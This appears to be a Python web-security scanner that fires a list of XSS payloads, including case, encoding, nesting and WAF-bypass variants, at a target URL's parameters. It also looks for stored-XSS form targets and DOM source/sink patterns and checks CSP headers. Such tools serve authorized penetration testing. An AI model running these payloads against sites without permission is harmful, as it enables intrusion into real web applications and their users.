#!/usr/bin/env python3
"""
Advanced XSS (Cross-Site Scripting) Scanner
Tests: Reflected, Stored, DOM-based XSS
Includes WAF bypass techniques
"""

import requests
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import html
import re

urllib3.disable_warnings()

class AdvancedXSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # XSS Payloads - Basic to Advanced
        self.xss_payloads = [
            # Basic payloads
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            
            # Event handlers
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<iframe src=javascript:alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            
            # String concatenation
            "javascript:alert('XSS')",
            "javascript:alert(String.fromCharCode(88,83,83))",
            
            # HTML5 tags
            "<video src=x onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            
            # Filter bypass - Case variation
            "<ScRiPt>alert('XSS')</sCrIpT>",
            "<sCrIpT>alert('XSS')</ScRiPt>",
            
            # Filter bypass - Encoded
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # Filter bypass - Nested tags
            "<<script>script>alert('XSS')<</script>/script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            
            # Filter bypass - Null bytes
            "<script\x00>alert('XSS')</script>",
            
            # Filter bypass - Unicode
            "<\u0073cript>alert('XSS')</script>",
            
            # Filter bypass - Tab/newline
            "<script\n>alert('XSS')</script>",
            "<script\t>alert('XSS')</script>",
            
            # Filter bypass - Comments
            "<!--<script>alert('XSS')</script>-->",
            "<script><!--alert('XSS')--></script>",
            
            # WAF bypass techniques
            "<svg><script>alert('XSS')</script></svg>",
            "<math><script>alert('XSS')</script></math>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            
            # Polyglot payloads
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            
            # DOM-based XSS
            "#<img src=x onerror=alert('XSS')>",
            
            # Template injection
            "{{alert('XSS')}}",
            "${alert('XSS')}",
            
            # Context-specific
            "'-alert('XSS')-'",
            "\"-alert('XSS')-\"",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            
            # JavaScript string escape
            "\\';alert('XSS');//",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
        ]
    
    def test_reflected_xss(self, url, params):
        """Test for Reflected XSS"""
        print("\n[*] Testing Reflected XSS...")
        
        vulnerabilities = []
        
        for param_name in params:
            print(f"\n[*] Testing parameter: {param_name}")
            
            for payload in self.xss_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    response = self.session.get(url, params=test_params, timeout=10)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        # Analyze context
                        context = self.analyze_xss_context(response.text, payload)
                        
                        if context['vulnerable']:
                            vuln_info = {
                                'parameter': param_name,
                                'payload': payload,
                                'context': context['location'],
                                'url': response.url
                            }
                            vulnerabilities.append(vuln_info)
                            
                            print(f"[+] VULNERABLE! Reflected XSS")
                            print(f"    Parameter: {param_name}")
                            print(f"    Payload: {payload}")
                            print(f"    Context: {context['location']}")
                            print(f"    URL: {response.url}")
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def analyze_xss_context(self, html_content, payload):
        """Analyze where and how the payload is reflected"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Check in script tags
        for script in soup.find_all('script'):
            if payload in str(script):
                return {
                    'vulnerable': True,
                    'location': 'Inside <script> tag',
                    'severity': 'CRITICAL'
                }
        
        # Check in HTML attributes
        for tag in soup.find_all(True):
            for attr, value in tag.attrs.items():
                if payload in str(value):
                    # Check if it's in event handler
                    if attr.startswith('on'):
                        return {
                            'vulnerable': True,
                            'location': f'In event handler: {tag.name}[{attr}]',
                            'severity': 'CRITICAL'
                        }
                    # Check if it's in href/src
                    elif attr in ['href', 'src', 'action', 'data']:
                        return {
                            'vulnerable': True,
                            'location': f'In URL attribute: {tag.name}[{attr}]',
                            'severity': 'HIGH'
                        }
                    else:
                        return {
                            'vulnerable': True,
                            'location': f'In HTML attribute: {tag.name}[{attr}]',
                            'severity': 'MEDIUM'
                        }
        
        # Check in HTML body
        if payload in html_content:
            # Check if HTML tags are preserved
            if '<' in payload and '>' in payload:
                if payload in html_content and not html.escape(payload) in html_content:
                    return {
                        'vulnerable': True,
                        'location': 'In HTML body (tags not escaped)',
                        'severity': 'HIGH'
                    }
        
        return {
            'vulnerable': False,
            'location': 'Reflected but escaped/sanitized',
            'severity': 'LOW'
        }
    
    def test_stored_xss(self, url):
        """Test for Stored XSS"""
        print("\n[*] Testing Stored XSS...")
        print("[!] Note: Stored XSS requires form submission and content verification")
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find forms that might store data
            forms = soup.find_all('form')
            stored_xss_targets = []
            
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                
                # Look for comment/post/profile forms
                form_html = str(form).lower()
                keywords = ['comment', 'post', 'message', 'review', 'profile', 'bio', 'description']
                
                if any(keyword in form_html for keyword in keywords):
                    target_info = {
                        'action': urljoin(url, form_action),
                        'method': form_method,
                        'form': form
                    }
                    stored_xss_targets.append(target_info)
                    
                    print(f"[+] Potential Stored XSS target found:")
                    print(f"    Action: {target_info['action']}")
                    print(f"    Method: {form_method}")
                    print(f"    Form contains keywords: {[k for k in keywords if k in form_html]}")
            
            return stored_xss_targets
        
        except Exception as e:
            print(f"[!] Error testing Stored XSS: {e}")
            return []
    
    def test_dom_xss(self, url):
        """Test for DOM-based XSS"""
        print("\n[*] Testing DOM-based XSS...")
        
        # DOM XSS sinks to look for
        dom_sinks = [
            'document.write',
            'document.writeln',
            'innerHTML',
            'outerHTML',
            'eval',
            'setTimeout',
            'setInterval',
            'Function',
            'location.href',
            'location.assign',
            'location.replace',
        ]
        
        # DOM XSS sources
        dom_sources = [
            'location.hash',
            'location.search',
            'document.URL',
            'document.documentURI',
            'document.referrer',
        ]
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            vulnerabilities = []
            
            # Check JavaScript code
            for script in soup.find_all('script'):
                script_content = script.string
                if script_content:
                    # Look for dangerous patterns
                    for source in dom_sources:
                        if source in script_content:
                            for sink in dom_sinks:
                                if sink in script_content:
                                    vuln_info = {
                                        'source': source,
                                        'sink': sink,
                                        'script': script_content[:200] + '...'
                                    }
                                    vulnerabilities.append(vuln_info)
                                    
                                    print(f"[+] Potential DOM XSS found!")
                                    print(f"    Source: {source}")
                                    print(f"    Sink: {sink}")
                                    print(f"    Requires manual verification")
            
            return vulnerabilities
        
        except Exception as e:
            print(f"[!] Error testing DOM XSS: {e}")
            return []
    
    def test_csp_bypass(self, url):
        """Test Content Security Policy"""
        print("\n[*] Testing Content Security Policy...")
        
        try:
            response = self.session.get(url, timeout=10)
            
            csp_header = response.headers.get('Content-Security-Policy', '')
            
            if not csp_header:
                print("[!] No CSP header found - XSS protection reduced")
                return {'present': False}
            
            print(f"[+] CSP found: {csp_header}")
            
            # Check for unsafe directives
            unsafe_patterns = [
                "'unsafe-inline'",
                "'unsafe-eval'",
                "data:",
                "*",
            ]
            
            weaknesses = []
            for pattern in unsafe_patterns:
                if pattern in csp_header:
                    weaknesses.append(pattern)
            
            if weaknesses:
                print(f"[!] CSP weaknesses found: {weaknesses}")
                return {'present': True, 'weaknesses': weaknesses}
            else:
                print("[+] CSP appears to be properly configured")
                return {'present': True, 'weaknesses': []}
        
        except Exception as e:
            print(f"[!] Error testing CSP: {e}")
            return {'present': False}
    
    def run_all_tests(self, url, params=None):
        """Run all XSS tests"""
        print(f"\n{'='*60}")
        print(f"XSS VULNERABILITY TESTING")
        print(f"Target: {url}")
        print(f"{'='*60}")
        
        results = {
            'reflected_xss': [],
            'stored_xss': [],
            'dom_xss': [],
            'csp': {}
        }
        
        # Test CSP first
        results['csp'] = self.test_csp_bypass(url)
        
        # Test Reflected XSS
        if params:
            results['reflected_xss'] = self.test_reflected_xss(url, params)
        
        # Test Stored XSS
        results['stored_xss'] = self.test_stored_xss(url)
        
        # Test DOM XSS
        results['dom_xss'] = self.test_dom_xss(url)
        
        # Summary
        print(f"\n{'='*60}")
        print("SUMMARY")
        print(f"{'='*60}")
        print(f"Reflected XSS: {len(results['reflected_xss'])} found")
        print(f"Stored XSS: {len(results['stored_xss'])} potential targets")
        print(f"DOM XSS: {len(results['dom_xss'])} potential vulnerabilities")
        print(f"CSP: {'Present' if results['csp']['present'] else 'Not present'}")
        
        return results


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 advanced_xss_scanner.py <url>")
        print("Example: python3 advanced_xss_scanner.py 'http://localhost/page.php?search=test'")
        sys.exit(1)
    
    url = sys.argv[1]
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    # Convert lists to single values
    params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
    
    scanner = AdvancedXSSScanner(url)
    scanner.run_all_tests(url, params if params else None)
